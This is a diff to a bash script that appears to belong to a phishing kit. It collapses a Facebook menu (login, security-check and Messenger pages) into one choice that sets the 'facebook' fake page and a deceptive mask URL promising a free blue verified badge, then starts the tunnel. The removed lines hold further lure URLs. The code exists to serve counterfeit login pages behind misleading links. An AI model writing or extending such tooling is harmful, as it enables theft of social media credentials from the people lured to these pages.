@@ -384,34 +384,9 @@ tunnel_menu() {
 	fi
 }
 ## Facebook
-site_facebook() {
-	cat <<- EOF
-
-
-		${WHITE}(${WHITE}01${WHITE})${GREEN} Facebook Login Page
-		${WHITE}(${WHITE}02${WHITE})${GREEN} Security Check Login Page
-		${WHITE}(${WHITE}03${WHITE})${GREEN} Messenger Login Page
-	EOF
-
-
-	read -p "${GREEN}:->${MAGENTA} Select an option : ${BLUE}"
-
-	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
-		website="facebook"
+site_facebook() { website="facebook"
 		mask='http://blue-verified-badge-for-facebook-free'
 		tunnel_menu
-	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
-		website="fb_security"
-		mask='http://make-your-facebook-secured-and-free-from-hackers'
-		tunnel_menu
-	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
-		website="fb_messenger"
-		mask='http://get-messenger-premium-features-free'
-		tunnel_menu
-	else
-		echo -ne "\n${RED}!!!{RED} Invalid Option, Try Again..."
-		{ sleep 1; clear; banner_small; site_facebook; }
-	fi
 }
 
 ## Instagram
